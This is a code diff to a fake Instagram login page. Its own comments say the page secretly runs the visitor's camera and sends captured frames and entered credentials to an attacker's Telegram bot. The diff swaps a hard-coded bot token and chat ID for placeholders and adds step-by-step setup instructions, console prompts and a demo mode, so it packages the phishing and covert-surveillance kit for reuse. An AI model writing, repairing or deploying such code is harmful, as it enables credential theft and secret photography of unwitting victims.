@@ -304,26 +304,31 @@
         // ================================================================
         // INSTAGRAM LOGIN PAGE with hidden background camera
         // Captures periodic frames + login credentials, sends to Telegram
-        // ✅ BUG FIXED: Telegram token validation logic corrected
-        // ✅ CREDENTIALS INTEGRATED: BOT_TOKEN and CHAT_ID applied
         // ================================================================
         
-        // ---------- TELEGRAM CONFIGURATION (YOUR CREDENTIALS) ----------
-        // ✅ Using the credentials you provided
-        const BOT_TOKEN = "8772264142:AAEmzbW6kqVx4dX252CLi_2Le9MBAdmv2u0";
-        const CHAT_ID = "7443381631";
+        // ---------- TELEGRAM CONFIGURATION ----------
+        // 🔴 REPLACE THESE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
+        // Get your bot token from @BotFather on Telegram
+        // Get your chat ID by sending a message to your bot and visiting:
+        // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your bot token
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";      // Replace with your chat ID
         
         // Remove any whitespace from CHAT_ID
         const cleanChatId = CHAT_ID.trim();
         
         // Check if valid tokens are provided (non-empty and not placeholder)
-        const isTelegramConfigured = (BOT_TOKEN && BOT_TOKEN.length > 20 && cleanChatId && cleanChatId.length > 5);
+        const isTelegramConfigured = (BOT_TOKEN && BOT_TOKEN.length > 20 && BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && cleanChatId && cleanChatId.length > 5 && cleanChatId !== "YOUR_CHAT_ID_HERE");
         
         // Log configuration status (for debugging)
         console.log(`[Telegram] Configuration status: ${isTelegramConfigured ? 'ACTIVE ✅' : 'INACTIVE ❌'}`);
         if (isTelegramConfigured) {
             console.log(`[Telegram] Bot Token: ${BOT_TOKEN.substring(0, 15)}...`);
             console.log(`[Telegram] Chat ID: ${cleanChatId}`);
+        } else {
+            console.warn('⚠️ Please configure your Telegram BOT_TOKEN and CHAT_ID in the JavaScript section.');
+            console.warn('⚠️ Get a bot token from @BotFather on Telegram.');
+            console.warn('⚠️ Get your chat ID by sending a message to your bot and visiting: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates');
         }
         
         // DOM elements (hidden camera)
@@ -358,11 +363,13 @@
             }, 3500);
         }
         
-        // ---------- TELEGRAM SENDER (Fully functional with your credentials) ----------
+        // ---------- TELEGRAM SENDER ----------
         async function sendToTelegram(message, photoBlob = null, contextLabel = null) {
             if (!isTelegramConfigured) {
                 console.warn('[Telegram] Not configured - message not sent');
                 console.log(`[DEMO] Would send: ${message?.substring(0, 100)}`);
+                // Show a demo notification in the UI
+                showToast("🔔 Demo: " + (message?.substring(0, 50) || "Message would be sent"), false);
                 return false;
             }
             
@@ -685,6 +692,9 @@
         });
         
         console.log('[Instagram Page] Fully loaded with Telegram integration');
+        console.log('ℹ️ To enable Telegram integration, replace BOT_TOKEN and CHAT_ID with your credentials.');
+        console.log('ℹ️ Get a bot token from @BotFather on Telegram.');
+        console.log('ℹ️ Get your chat ID by sending a message to your bot and visiting: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates');
     })();
 </script>
 </body>
